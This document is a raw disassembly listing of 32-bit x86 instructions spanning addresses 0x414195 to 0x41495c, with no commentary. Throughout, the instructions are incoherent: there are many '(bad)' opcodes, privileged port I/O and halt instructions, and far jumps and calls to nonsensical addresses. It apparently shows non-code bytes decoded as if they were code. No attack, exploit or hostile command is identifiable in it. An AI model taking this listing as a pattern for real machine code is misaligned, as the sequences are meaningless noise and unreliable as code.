  414195:	(bad)  
  414196:	fstp   QWORD PTR [esp+esi*1]
  414199:	mov    bh,0xda
  41419b:	pop    edi
  41419c:	mov    dl,BYTE PTR [edx-0x76868619]
  4141a2:	inc    edi
  4141a3:	jnp    0x4141fe
  4141a5:	mov    es,ebx
  4141a7:	xchg   edi,eax
  4141a8:	stc    
  4141a9:	and    ch,BYTE PTR fs:[esi-0x3ea3638d]
  4141b0:	adc    edi,edi
  4141b2:	gs mov eax,0xeb20e5e7
  4141b8:	stos   DWORD PTR es:[edi],eax
  4141b9:	pop    ecx
  4141ba:	inc    eax
  4141bb:	push   ds
  4141bc:	repnz or BYTE PTR [esi-0x67d7e844],ch
  4141c3:	xor    eax,0x537d6262
  4141c8:	retf   
  4141c9:	or     esi,0xffffffdd
  4141cc:	outs   dx,BYTE PTR ds:[esi]
  4141cd:	cwde   
  4141ce:	shl    ah,cl
  4141d0:	jmp    0x338163f5
  4141d5:	jb     0x414182
  4141d7:	test   al,0x7
  4141d9:	push   ss
  4141da:	clc    
  4141db:	call   0x82b1:0x848146bf
  4141e2:	inc    edi
  4141e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141e4:	out    0x73,al
  4141e6:	int    0x40
  4141e8:	ins    DWORD PTR es:[edi],dx
  4141e9:	mov    DWORD PTR [esi-0x27aca4b0],ebx
  4141ef:	push   ebp
  4141f0:	adc    bh,BYTE PTR [edi+0x4d]
  4141f3:	or     al,0xa8
  4141f5:	push   eax
  4141f6:	pop    ebp
  4141f7:	sbb    dl,BYTE PTR [edx]
  4141f9:	scas   al,BYTE PTR es:[edi]
  4141fa:	mov    ch,0x5e
  4141fc:	mov    ah,0xfd
  4141fe:	xchg   ebp,eax
  4141ff:	jg     0x4141c4
  414201:	sub    BYTE PTR [ebp+0x4f],ch
  414204:	mov    al,ds:0x3b3fdb3
  414209:	adc    al,0x21
  41420b:	push   cs
  41420c:	aas    
  41420d:	or     bh,BYTE PTR [ebx-0x62e964c4]
  414213:	jge    0x41425c
  414215:	aad    0xd8
  414217:	sahf   
  414218:	sbb    bl,BYTE PTR [eax+0x6653e80f]
  41421e:	cdq    
  41421f:	aaa    
  414220:	xchg   edx,eax
  414221:	icebp  
  414222:	ror    edi,1
  414224:	and    esi,DWORD PTR [edx]
  414226:	add    al,0x1f
  414228:	pushf  
  414229:	pop    ecx
  41422a:	lods   al,BYTE PTR ds:[esi]
  41422b:	jo     0x414252
  41422d:	jl     0x414243
  41422f:	cmc    
  414230:	mov    bl,0xb3
  414232:	(bad)  
  414233:	(bad)  
  414234:	sbb    ebx,edi
  414236:	jmp    0xbbfd:0x58327214
  41423d:	scas   al,BYTE PTR es:[edi]
  41423e:	xor    ch,dl
  414240:	mov    ah,0x7c
  414242:	pushf  
  414243:	lahf   
  414244:	cdq    
  414245:	and    ch,ch
  414247:	mov    cl,0xfe
  414249:	mov    ebx,0xfc943fbb
  41424e:	push   ebp
  41424f:	mov    bh,0x2b
  414251:	clc    
  414252:	frstor [edi]
  414254:	mov    ds:0xd8523e56,al
  414259:	dec    edx
  41425a:	sbb    DWORD PTR ds:0xc310175a,ebp
  414260:	mov    ebx,0xf9045c2f
  414265:	xor    DWORD PTR ds:0xc0da97ff,ecx
  41426b:	jge    0x414252
  41426d:	jno    0x41425d
  41426f:	div    BYTE PTR [ebx]
  414271:	mov    ch,0xe7
  414273:	mov    eax,ds:0x53214324
  414278:	xchg   edx,eax
  414279:	in     al,0x36
  41427b:	push   eax
  41427c:	cmp    eax,0xffffffa1
  41427f:	jl     0x414206
  414281:	sub    ebx,DWORD PTR [ecx-0x2c]
  414284:	push   ebx
  414285:	test   DWORD PTR [esp+edx*8+0x7f],edi
  414289:	jb     0x4142f2
  41428b:	out    dx,eax
  41428c:	jbe    0x414242
  41428e:	sub    dh,BYTE PTR ds:0x4b043f5b
  414294:	out    0xf8,eax
  414296:	hlt    
  414297:	daa    
  414298:	leave  
  414299:	xor    eax,0x751ae069
  41429e:	pop    ds
  41429f:	(bad)
  4142a2:	iret   
  4142a3:	sub    al,cl
  4142a5:	rdpmc  
  4142a7:	sbb    BYTE PTR [esi+ebp*2],dh
  4142aa:	loope  0x41424c
  4142ac:	push   DWORD PTR [edx-0x47]
  4142af:	js     0x41430a
  4142b1:	test   ecx,ebx
  4142b3:	leave  
  4142b4:	nop
  4142b5:	pushf  
  4142b6:	dec    esi
  4142b7:	je     0x414278
  4142b9:	mov    ch,BYTE PTR [ebx+0x28]
  4142bc:	pop    es
  4142bd:	aaa    
  4142be:	loop   0x414299
  4142c0:	imul   ebp,DWORD PTR cs:[eax+0x2ee43de],0x84eb795c
  4142cb:	mov    cl,0x37
  4142cd:	jne    0x41430c
  4142cf:	mov    bl,0xf4
  4142d1:	and    edi,DWORD PTR [edx+ebp*8]
  4142d4:	ds pusha 
  4142d6:	or     ebp,DWORD PTR [ebx-0x39]
  4142d9:	adc    DWORD PTR [esp+eax*1-0x73],edx
  4142dd:	push   ss
  4142de:	mov    ah,0xd1
  4142e0:	inc    esi
  4142e1:	shr    dl,1
  4142e3:	out    0xbf,eax
  4142e5:	dec    eax
  4142e6:	sub    eax,0xbcbcbe4d
  4142eb:	inc    ecx
  4142ec:	test   cl,bl
  4142ee:	cmp    al,0xef
  4142f0:	jmp    0xd6c810a1
  4142f5:	(bad)
  4142f9:	je     0x4142f0
  4142fb:	jmp    0x1de0bc6b
  414300:	mov    ecx,edi
  414302:	inc    ebp
  414303:	jecxz  0x414316
  414305:	mov    ch,0xf6
  414307:	mov    ch,0x15
  414309:	rcl    DWORD PTR [esi+edx*2+0x5],0x85
  41430e:	aad    0xac
  414310:	mov    DWORD PTR [ecx+0x75d47cc4],0xc75a82f2
  41431a:	lea    esp,[esi]
  41431c:	jnp    0x4142db
  41431e:	inc    esi
  41431f:	mov    DWORD PTR ds:0x4ca90cb6,edi
  414325:	xor    DWORD PTR [edx-0x29],esp
  414328:	and    eax,0xced7777d
  41432d:	ja     0x41439c
  41432f:	into   
  414330:	add    al,0x61
  414332:	loop   0x4143b3
  414334:	retf   
  414335:	loope  0x41430e
  414337:	or     al,0x12
  414339:	inc    edx
  41433a:	pop    esi
  41433b:	push   eax
  41433c:	jae    0x414343
  41433e:	data16 mov bh,BYTE PTR [ebp-0x1c]
  414342:	dec    esp
  414343:	jne    0x4142e8
  414345:	jne    0x414388
  414347:	scas   eax,DWORD PTR es:[edi]
  414348:	dec    eax
  414349:	mov    BYTE PTR [edx+esi*4+0x47],ah
  41434d:	lock sbb eax,0xbc1456be
  414353:	adc    al,0x42
  414355:	xchg   BYTE PTR [ecx+0x4dbc83ca],ah
  41435b:	outs   dx,DWORD PTR ds:[esi]
  41435c:	(bad)  
  41435e:	pop    edi
  41435f:	cmp    al,0x4
  414361:	fs push 0xe66f7e52
  414367:	and    dl,al
  414369:	in     al,0x10
  41436b:	inc    esi
  41436c:	leave  
  41436d:	fist   DWORD PTR [esi+0x7b]
  414370:	std    
  414371:	loopne 0x414331
  414373:	test   eax,0x99850257
  414378:	push   ecx
  414379:	pop    ecx
  41437a:	push   ecx
  41437b:	mov    al,0xce
  41437d:	sar    DWORD PTR [edi+0x5a],1
  414380:	sub    eax,0x9eb4e47e
  414385:	(bad)  
  414386:	(bad)  
  414387:	shl    DWORD PTR [eax-0x70],1
  41438a:	mov    ebp,0x785f6d35
  41438f:	pop    esp
  414390:	loopne 0x414393
  414392:	gs xchg edi,eax
  414394:	mov    ds:0xbf1ea10,al
  414399:	mov    dh,0xa2
  41439b:	int    0x39
  41439d:	in     al,dx
  41439e:	hlt    
  41439f:	pop    edi
  4143a0:	mov    ecx,0x1284a6f6
  4143a5:	mov    ebx,0xacc49cd2
  4143aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143ab:	fild   DWORD PTR [ecx-0x4d]
  4143ae:	ins    BYTE PTR es:[edi],dx
  4143af:	mov    esp,0xc232673e
  4143b4:	push   0xc8ee6eb8
  4143b9:	inc    ebp
  4143ba:	sbb    BYTE PTR [ebx+0x65],bl
  4143bd:	dec    edx
  4143be:	jg     0x4143d5
  4143c0:	jnp    0x414382
  4143c2:	or     cl,ch
  4143c4:	mov    ds:0xa78cb7ae,al
  4143c9:	push   edx
  4143ca:	pushf  
  4143cb:	in     al,dx
  4143cc:	lock adc edx,DWORD PTR [ebp-0x38c877fc]
  4143d3:	pop    es
  4143d4:	cmp    bh,al
  4143d6:	loope  0x414392
  4143d8:	cmc    
  4143d9:	popa   
  4143da:	(bad)  
  4143dc:	stc    
  4143dd:	add    ebp,0x22
  4143e0:	aam    0x64
  4143e2:	cmp    al,0x3b
  4143e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143e5:	mov    edx,DWORD PTR [esi]
  4143e7:	adc    ecx,DWORD PTR [edx]
  4143e9:	call   0xcefd:0x6f5fd5f2
  4143f0:	aas    
  4143f1:	and    BYTE PTR [eax],0xd2
  4143f4:	xchg   edi,eax
  4143f5:	mov    ebx,0xf0cb0132
  4143fa:	jmp    0xff7cd9ef
  4143ff:	in     eax,0x42
  414401:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414402:	(bad)  
  414403:	fdivr  DWORD PTR [edx]
  414405:	add    ch,BYTE PTR [edi+0x64]
  414408:	pop    edx
  414409:	add    DWORD PTR [ecx-0x58],edi
  41440c:	test   al,0xea
  41440e:	xor    esp,DWORD PTR [ebp+0x6c]
  414411:	xchg   esi,eax
  414412:	or     ebp,DWORD PTR ds:0x58048be8
  414418:	jl     0x4143e8
  41441a:	jp     0x414492
  41441c:	test   BYTE PTR [esi-0x48],ah
  41441f:	push   ebp
  414420:	dec    ebp
  414421:	pushf  
  414422:	fcmovne st,st(7)
  414424:	mov    WORD PTR [ecx],es
  414426:	dec    ecx
  414427:	sti    
  414428:	xor    edx,0xb7dad121
  41442e:	sub    BYTE PTR [ebx-0xb],cl
  414431:	cmp    BYTE PTR [eax+0x3a],0xbd
  414435:	stos   DWORD PTR es:[edi],eax
  414436:	stos   DWORD PTR es:[edi],eax
  414437:	shr    BYTE PTR [edi-0x10],0x99
  41443b:	adc    esi,0x7b61a743
  414441:	or     eax,0xa5dbac60
  414446:	inc    edx
  414447:	out    0x7f,eax
  414449:	loopne 0x414435
  41444b:	or     edx,esi
  41444d:	xor    eax,0x3b542eaf
  414452:	test   BYTE PTR [edx+0x5],dh
  414455:	test   BYTE PTR [edi],al
  414457:	push   ss
  414458:	pop    ebx
  414459:	push   DWORD PTR [ebx-0x7e5be742]
  41445f:	call   0x9416c5af
  414464:	add    al,cl
  414466:	jecxz  0x4143f1
  414468:	xchg   esp,eax
  414469:	jbe    0x414407
  41446b:	loope  0x4144a8
  41446d:	mov    esp,0x5ebf96af
  414472:	fsubr  QWORD PTR [ebx-0x4]
  414475:	jle    0x4144ea
  414477:	dec    ebp
  414478:	(bad)  
  414479:	jle    0x414426
  41447b:	add    edi,DWORD PTR [esi+0x31]
  41447e:	sbb    dl,al
  414480:	cld    
  414481:	sub    BYTE PTR [edx-0x17],bh
  414484:	addr16 nop
  414486:	jae    0x414506
  414488:	je     0x414436
  41448a:	test   eax,0xe578aa6b
  41448f:	lods   al,BYTE PTR ds:[esi]
  414490:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414491:	adc    edi,DWORD PTR [edi-0x1ea6ff3a]
  414497:	cmp    DWORD PTR [ebp-0x26],ecx
  41449a:	addr16 mov eax,ds:0xb3a7
  41449e:	add    cl,BYTE PTR [ebp+0x10]
  4144a1:	into   
  4144a2:	aas    
  4144a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144a4:	xchg   ch,al
  4144a6:	pop    ebx
  4144a7:	pop    ecx
  4144a8:	and    eax,0x815c101a
  4144ad:	jmp    0xed4733ac
  4144b2:	(bad)  
  4144b4:	or     dl,BYTE PTR ds:0x43953fd7
  4144ba:	mov    bh,0x32
  4144bc:	push   esp
  4144bd:	cld    
  4144be:	in     eax,0xc8
  4144c0:	jnp    0x4144f4
  4144c2:	push   0x34
  4144c4:	ins    DWORD PTR es:[edi],dx
  4144c5:	mov    ds,ebp
  4144c7:	or     ecx,DWORD PTR [eax+0x604d3581]
  4144cd:	fcomp  QWORD PTR [edx-0x49]
  4144d0:	cmp    BYTE PTR cs:[eax-0x204d188e],ah
  4144d7:	adc    al,0x5c
  4144d9:	xchg   ebx,eax
  4144da:	mov    ebp,ds
  4144dc:	iret   
  4144dd:	jle    0x414548
  4144df:	das    
  4144e0:	inc    edi
  4144e1:	imul   eax,esi,0x3a
  4144e4:	test   BYTE PTR [esi-0x14],cl
  4144e7:	dec    esi
  4144e8:	cwde   
  4144e9:	iret   
  4144ea:	sti    
  4144eb:	in     eax,0xa1
  4144ed:	mov    eax,ds:0xc5b0aa8e
  4144f2:	outs   dx,DWORD PTR ds:[esi]
  4144f3:	xchg   esi,eax
  4144f4:	scas   al,BYTE PTR es:[edi]
  4144f5:	jmp    0xa9f2:0x85982da4
  4144fc:	inc    edx
  4144fd:	xor    eax,0x5b6e9fdb
  414502:	imul   eax,DWORD PTR [ebp+0x1023ddd5],0x58
  414509:	test   DWORD PTR [ebp+0x56f9d657],eax
  41450f:	or     DWORD PTR ds:0x1ff2dbdb,edi
  414515:	jo     0x414548
  414517:	dec    esp
  414518:	jnp    0x414560
  41451a:	mov    bh,0xcd
  41451c:	test   eax,0x8e51011f
  414521:	push   ebx
  414522:	rcr    BYTE PTR [eax],1
  414524:	jle    0x4144fc
  414526:	sahf   
  414527:	sahf   
  414528:	ss (bad) 
  41452a:	fnstenv [edx]
  41452c:	jp     0x414528
  41452e:	rcr    BYTE PTR [eax+0x13],cl
  414531:	fiadd  DWORD PTR [ebx]
  414533:	pop    ebp
  414534:	and    bl,ch
  414536:	push   ebx
  414537:	add    BYTE PTR [edx+0x77],dl
  41453a:	test   DWORD PTR [ebp+0x78],ebx
  41453d:	push   esp
  41453e:	aam    0x67
  414540:	push   cs
  414541:	jp     0x414524
  414543:	addr16 mov ecx,0x4f2d7c6c
  414549:	xchg   edx,eax
  41454a:	xor    BYTE PTR [eax],bh
  41454c:	popa   
  41454d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41454e:	jne    0x41450a
  414550:	mov    esi,0x2d13618
  414555:	dec    ebp
  414556:	sub    cl,bh
  414558:	in     al,0x67
  41455a:	or     DWORD PTR [edx-0x2e],0xffffffaf
  41455e:	pop    es
  41455f:	aas    
  414560:	adc    BYTE PTR [ebx+0x61],ch
  414563:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414564:	neg    DWORD PTR [edx+0x73f99cbf]
  41456a:	jecxz  0x41452e
  41456c:	xchg   DWORD PTR ds:0x49a0d99,ebx
  414572:	imul   edi,esp,0x41
  414575:	lds    esi,FWORD PTR [ecx+0x1f]
  414578:	push   es
  414579:	jbe    0x414543
  41457b:	or     eax,0xa9e5c53c
  414580:	mov    bh,ch
  414582:	pop    esi
  414583:	mov    edx,0xe1cf2dec
  414588:	sbb    eax,0x9d64057
  41458d:	push   ss
  41458e:	popa   
  41458f:	imul   ecx,esi,0xffffffbe
  414592:	mov    al,0xb9
  414594:	mov    dh,0xe8
  414596:	push   0xb
  414598:	inc    ebx
  414599:	enter  0x632b,0xab
  41459d:	cli    
  41459e:	or     ah,ah
  4145a0:	push   edi
  4145a1:	stc    
  4145a2:	cdq    
  4145a3:	pop    esi
  4145a4:	mov    fs,WORD PTR [esi+0x61]
  4145a7:	int3   
  4145a8:	mov    edi,0x4aab4fcd
  4145ad:	sub    al,0x75
  4145af:	add    ch,0xad
  4145b2:	mov    bh,0x69
  4145b4:	inc    edi
  4145b5:	inc    ebp
  4145b6:	jne    0x4145b0
  4145b8:	xchg   DWORD PTR [edx],esp
  4145ba:	push   esp
  4145bb:	mov    edx,DWORD PTR [eax+ecx*1-0x47]
  4145bf:	mov    WORD PTR [edx-0x55563257],ds
  4145c5:	pop    esi
  4145c6:	loop   0x4145c2
  4145c8:	lods   al,BYTE PTR ds:[esi]
  4145c9:	mov    esi,0x997a71a
  4145ce:	ins    DWORD PTR es:[edi],dx
  4145cf:	out    dx,al
  4145d0:	js     0x4145e2
  4145d2:	mov    ebp,0x7dadc293
  4145d7:	dec    ebp
  4145d8:	mov    edi,0x5bbf78ae
  4145dd:	mov    ebx,0xefd8dacd
  4145e2:	pop    ss
  4145e3:	cwde   
  4145e4:	cmp    ebx,ebp
  4145e6:	shl    edx,1
  4145e8:	gs mov ebx,0x6d8852a3
  4145ee:	push   edx
  4145ef:	icebp  
  4145f0:	cmc    
  4145f1:	aaa    
  4145f2:	fdiv   QWORD PTR [edi]
  4145f4:	xchg   ebp,eax
  4145f5:	xchg   ebx,eax
  4145f6:	cmp    BYTE PTR [ebp+0x4f],dh
  4145f9:	inc    ebx
  4145fa:	pop    edx
  4145fb:	jbe    0x4145e7
  4145fd:	iret   
  4145fe:	je     0x414631
  414600:	jo     0x414584
  414602:	lahf   
  414603:	and    al,0xf2
  414605:	ss xor al,0xd0
  414608:	mov    DWORD PTR [eax+0x38433592],ecx
  41460e:	and    dl,BYTE PTR [ebx+0x213b7377]
  414614:	movlps QWORD PTR [edx],xmm4
  414617:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414618:	xchg   ebp,eax
  414619:	fld    QWORD PTR [edi]
  41461b:	inc    ebp
  41461c:	cwde   
  41461d:	lea    edi,[esi-0x37]
  414620:	out    0xe0,eax
  414622:	dec    ebx
  414623:	aas    
  414624:	push   ds
  414625:	ds jne 0x4145e0
  414628:	add    BYTE PTR [ecx-0x3721f8a2],0xb0
  41462f:	jne    0x41464e
  414631:	rol    DWORD PTR [edi-0xd],0xb6
  414635:	pop    edi
  414636:	dec    eax
  414637:	push   ebp
  414638:	xchg   ebp,eax
  414639:	push   esi
  41463a:	xlat   BYTE PTR ds:[ebx]
  41463b:	dec    eax
  41463c:	inc    eax
  41463d:	outs   dx,BYTE PTR ds:[esi]
  41463e:	arpl   WORD PTR [edi],ax
  414640:	dec    edi
  414641:	adc    bh,cl
  414643:	cmp    eax,0x9cfba080
  414648:	mov    ecx,0x87244da
  41464d:	fild   DWORD PTR gs:[edi+0x3189405f]
  414654:	xchg   ecx,eax
  414655:	inc    edi
  414656:	adc    edx,DWORD PTR [ecx]
  414658:	out    0x63,al
  41465a:	or     dh,BYTE PTR [ebx+esi*2-0x6e]
  41465e:	pusha  
  41465f:	and    dl,BYTE PTR [ebx]
  414661:	lods   al,BYTE PTR ds:[esi]
  414662:	fidiv  WORD PTR [eax+0x6234bc7a]
  414668:	xchg   ebp,eax
  414669:	inc    edx
  41466a:	adc    ebx,DWORD PTR [eax-0x7592c8a5]
  414670:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414671:	outs   dx,BYTE PTR ds:[esi]
  414672:	sub    DWORD PTR [esi+0x99bc4ed],ebp
  414678:	push   eax
  414679:	retf   0xc0f7
  41467c:	or     al,0xcb
  41467e:	xchg   DWORD PTR [edi+edx*2],esp
  414681:	or     edx,DWORD PTR [ebx-0xdec1106]
  414687:	rcr    BYTE PTR [edi],0xe4
  41468a:	mov    ebx,0x6e5b0129
  41468f:	dec    edi
  414690:	aam    0x1
  414692:	sbb    eax,0x2d481f27
  414697:	je     0x4146df
  414699:	pop    ss
  41469a:	ror    DWORD PTR [ebx],0xe3
  41469d:	and    DWORD PTR [edi+0x16],edx
  4146a0:	mov    eax,ds:0x9e7cfc7a
  4146a5:	sub    BYTE PTR [edi-0x28],dh
  4146a8:	sub    al,0xe7
  4146aa:	fsub   DWORD PTR [esi]
  4146ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146ad:	lds    edx,FWORD PTR [ebp+0x41d3e23]
  4146b3:	sub    dl,BYTE PTR [edi-0x1d9e174b]
  4146b9:	jg     0x4146e3
  4146bb:	mov    ah,0xc6
  4146bd:	inc    BYTE PTR [ebx+0x61]
  4146c0:	loopne 0x4146eb
  4146c2:	dec    ecx
  4146c3:	or     al,0xf2
  4146c5:	pop    esp
  4146c6:	add    eax,0xf5b2802b
  4146cb:	adc    al,0xb5
  4146cd:	(bad)
  4146d0:	dec    edx
  4146d1:	mov    eax,0x327f28f5
  4146d6:	xor    ecx,0x67
  4146d9:	xor    dl,BYTE PTR [edi]
  4146db:	fwait
  4146dc:	xchg   ebp,eax
  4146dd:	mov    cl,0x46
  4146df:	imul   ecx,DWORD PTR [ecx+0x6e2839fc],0xffffffda
  4146e6:	jbe    0x414720
  4146e8:	cwde   
  4146e9:	adc    BYTE PTR ds:0x9828bfb8,cl
  4146ef:	lds    edx,FWORD PTR gs:[eax-0x14]
  4146f3:	xchg   esp,eax
  4146f4:	lods   eax,DWORD PTR ds:[esi]
  4146f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146f6:	cmp    dl,ch
  4146f8:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4146fa:	push   esp
  4146fb:	xor    eax,0x8d50c50e
  414700:	mov    BYTE PTR [ecx-0x38],dl
  414703:	rcr    DWORD PTR [ebx+ecx*8-0x64],1
  414707:	lods   al,BYTE PTR ds:[esi]
  414708:	and    dl,bh
  41470a:	shr    DWORD PTR [ecx-0x21],0x9f
  41470e:	jo     0x4146dc
  414710:	pushf  
  414711:	xor    eax,0x2bbb9e62
  414716:	adc    eax,DWORD PTR [edx-0x76d8a857]
  41471c:	cmp    al,0xcb
  41471e:	fwait
  41471f:	cli    
  414720:	daa    
  414721:	stc    
  414722:	cli    
  414723:	cmp    edx,0x41
  414726:	lahf   
  414727:	enter  0x322a,0xd5
  41472b:	jb     0x4146df
  41472d:	in     al,dx
  41472e:	fcomp  QWORD PTR [edx-0x65]
  414731:	dec    eax
  414732:	mov    dl,0xfd
  414734:	icebp  
  414735:	xchg   esi,eax
  414736:	dec    edi
  414737:	adc    dl,ch
  414739:	mov    cl,dl
  41473b:	jle    0x414701
  41473d:	inc    edi
  41473e:	rcl    BYTE PTR [eax-0x12],0x43
  414742:	popa   
  414743:	cmc    
  414744:	lea    esp,[edi]
  414746:	fs cmp eax,0x73c74dc1
  41474c:	dec    ebx
  41474d:	mov    DWORD PTR [eax],eax
  41474f:	adc    al,0x84
  414751:	jle    0x4146de
  414753:	fdiv   DWORD PTR [edx+esi*1]
  414756:	lds    esi,FWORD PTR [ecx+0x2f195a3b]
  41475c:	or     eax,DWORD PTR [ecx]
  41475e:	inc    edi
  41475f:	ficomp DWORD PTR [edi+0x6a774362]
  414765:	es jmp 0xb371:0x1c50de38
  41476d:	pop    ss
  41476e:	mov    bh,0x2f
  414770:	push   ebx
  414771:	test   al,0x32
  414773:	jg     0x41478b
  414775:	in     al,0x80
  414777:	je     0x4147d0
  414779:	in     eax,dx
  41477a:	cmp    BYTE PTR [bp-0x207b],bl
  41477f:	jb     0x414789
  414781:	hlt    
  414782:	arpl   WORD PTR [edx-0x3aa82c78],bp
  414788:	jmp    0xf3a939b6
  41478d:	push   ds
  41478e:	scas   al,BYTE PTR es:[edi]
  41478f:	(bad)  
  414791:	aad    0x2f
  414793:	fld    TBYTE PTR [eax-0x61968ec3]
  414799:	sbb    ah,BYTE PTR [edi-0x3]
  41479c:	mov    al,ds:0x49681318
  4147a1:	iret   
  4147a2:	dec    esi
  4147a3:	and    ah,BYTE PTR [edx-0xf]
  4147a6:	cmp    ebx,DWORD PTR [ecx-0x6d]
  4147a9:	pop    ds
  4147aa:	mov    esi,0xa7c4f801
  4147af:	gs dec ecx
  4147b1:	adc    eax,0x2550829a
  4147b6:	push   0xffffffb1
  4147b8:	retf   0x90e0
  4147bb:	adc    eax,0xa5a1afb5
  4147c0:	fisttp QWORD PTR [ebp+0x781827da]
  4147c6:	inc    edi
  4147c7:	xchg   edi,eax
  4147c8:	pop    ecx
  4147c9:	mov    ds:0xa5654f80,eax
  4147ce:	jle    0x4147c5
  4147d0:	test   BYTE PTR [esi-0x61fa0ad7],ch
  4147d6:	mul    esi
  4147d8:	call   0xab3a:0xa578facb
  4147df:	xor    al,0x11
  4147e1:	add    eax,0xc7ddf74e
  4147e6:	test   dl,bh
  4147e8:	xchg   esi,eax
  4147e9:	jp     0x41483f
  4147eb:	aas    
  4147ec:	push   edi
  4147ed:	imul   esp,DWORD PTR [ebx+0xae992d],0x5407f971
  4147f7:	lock stos DWORD PTR es:[edi],eax
  4147f9:	ja     0x4147db
  4147fb:	xor    al,0xb0
  4147fd:	fistp  QWORD PTR [ecx-0x31ac4442]
  414803:	push   ebx
  414804:	out    0xa2,eax
  414806:	out    dx,al
  414807:	push   edi
  414808:	lds    ebx,FWORD PTR [eax]
  41480a:	cmp    esp,DWORD PTR [ecx+0x5f11dd55]
  414810:	cmp    DWORD PTR [ecx+0x6b],edx
  414813:	cli    
  414814:	mov    ecx,0xa08771cf
  414819:	out    0x8e,eax
  41481b:	mov    gs,WORD PTR [edx+ecx*2]
  41481e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41481f:	out    dx,eax
  414820:	xor    ebx,0xa7fc5d9e
  414826:	pop    ecx
  414827:	(bad)  
  414828:	sub    DWORD PTR [ecx],esi
  41482a:	xor    DWORD PTR [edx-0x4c7ca330],0xd
  414831:	dec    ebx
  414832:	sbb    ebp,DWORD PTR [edx]
  414834:	enter  0x5149,0xed
  414838:	fdivr  QWORD PTR [ecx]
  41483a:	adc    ch,BYTE PTR [edi-0x22]
  41483d:	inc    eax
  41483e:	push   0x5cca8e1e
  414843:	shr    eax,cl
  414845:	and    eax,0x60779024
  41484a:	and    cl,cl
  41484c:	sub    ah,cl
  41484e:	sbb    esi,0x4b
  414851:	inc    esi
  414852:	imul   esi,ebx,0x5b
  414855:	and    DWORD PTR [esi+0x40],esi
  414858:	sbb    eax,edx
  41485a:	push   esp
  41485b:	js     0x414834
  41485d:	mov    ch,0x40
  41485f:	mov    dh,0xbe
  414861:	pcmpeqd mm7,mm6
  414864:	test   BYTE PTR fs:[esi-0x4c1b3c6e],bh
  41486b:	push   edx
  41486c:	mov    ch,0xe1
  41486e:	dec    esi
  41486f:	daa    
  414870:	dec    ebx
  414871:	test   DWORD PTR [esi+0x7949a700],ebp
  414877:	test   al,0x45
  414879:	popa   
  41487a:	ss call 0x1356:0x57ad27a1
  414882:	cmp    BYTE PTR [ecx+0x5a],0x2a
  414886:	xor    ebx,DWORD PTR [ebx]
  414888:	test   BYTE PTR [ebx+0x2100dced],bh
  41488e:	dec    ecx
  41488f:	test   eax,0x5fafcf63
  414894:	or     BYTE PTR ds:0x4f8461ec,dh
  41489a:	xchg   esp,eax
  41489b:	mov    ds:0x489e652f,al
  4148a0:	or     al,0x5d
  4148a2:	ja     0x414824
  4148a4:	fadd   DWORD PTR [edi]
  4148a6:	xchg   BYTE PTR [ebx-0x2f],bh
  4148a9:	sti    
  4148aa:	mov    al,ds:0xf182977f
  4148af:	test   al,0xb5
  4148b1:	ss retf 0x48f9
  4148b5:	fst    QWORD PTR [eax-0x5e]
  4148b8:	out    dx,al
  4148b9:	sar    BYTE PTR [edx],1
  4148bb:	mov    ch,0x6
  4148bd:	jp     0x414868
  4148bf:	jae    0x414894
  4148c1:	ja     0x41484d
  4148c3:	sar    DWORD PTR [edi-0x6ccd9119],0xbe
  4148ca:	rol    DWORD PTR [edx+ecx*1-0xd1fd462],0xe4
  4148d2:	(bad)  
  4148d3:	mov    eax,0xa8a4a7e2
  4148d8:	cli    
  4148d9:	xchg   BYTE PTR [ebp+0x4a72172a],cl
  4148df:	xor    DWORD PTR [bp+0xd],0x7c93f24
  4148e7:	shl    DWORD PTR [ebp+0x40738712],0x41
  4148ee:	xor    DWORD PTR [ecx-0x6fc4f4ab],esp
  4148f4:	ror    BYTE PTR [edi],0x82
  4148f7:	jbe    0x4148e3
  4148f9:	addr16 xchg esp,eax
  4148fb:	mov    dl,0x65
  4148fd:	xchg   ecx,eax
  4148fe:	push   cs
  4148ff:	xchg   ecx,eax
  414900:	daa    
  414901:	inc    ecx
  414902:	lods   eax,DWORD PTR ds:[esi]
  414903:	mov    bh,0xc
  414905:	outs   dx,DWORD PTR ds:[esi]
  414906:	and    bh,cl
  414908:	pop    edx
  414909:	adc    ah,ch
  41490b:	cmp    al,0x54
  41490d:	sub    ebx,DWORD PTR [edi]
  41490f:	pop    esi
  414910:	int3   
  414911:	test   bh,bl
  414913:	ret    0x1d4d
  414916:	xor    dh,bh
  414918:	xchg   ebx,eax
  414919:	ret    
  41491a:	pop    ecx
  41491b:	xor    ebp,DWORD PTR [edx]
  41491d:	loop   0x414990
  41491f:	add    DWORD PTR [ebp+0x42],edx
  414922:	test   BYTE PTR [ebx-0x7af00aa8],0x57
  414929:	lahf   
  41492a:	addr16 dec ecx
  41492c:	push   ss
  41492d:	sbb    DWORD PTR [ebp-0xd],edx
  414930:	pop    ebp
  414931:	lods   eax,DWORD PTR ds:[esi]
  414932:	fcomip st,st(4)
  414934:	mov    al,0x49
  414936:	shl    DWORD PTR [ebx],1
  414938:	jg     0x4148c6
  41493a:	lahf   
  41493b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41493c:	rcr    ebx,0xf8
  41493f:	clc    
  414940:	retf   0x35c1
  414943:	adc    BYTE PTR [ebp-0x78],ah
  414946:	scas   al,BYTE PTR es:[edi]
  414947:	push   eax
  414948:	stos   BYTE PTR es:[edi],al
  414949:	inc    edi
  41494a:	retf   
  41494b:	icebp  
  41494c:	sbb    esp,DWORD PTR [ecx]
  41494e:	mov    al,ds:0x5421f585
  414953:	jge    0x414927
  414955:	cwde   
  414956:	jo     0x4148e8
  414958:	lea    esi,[ebp+0x23]
  41495b:	sti    
  41495c:	mov    ah,0xc1
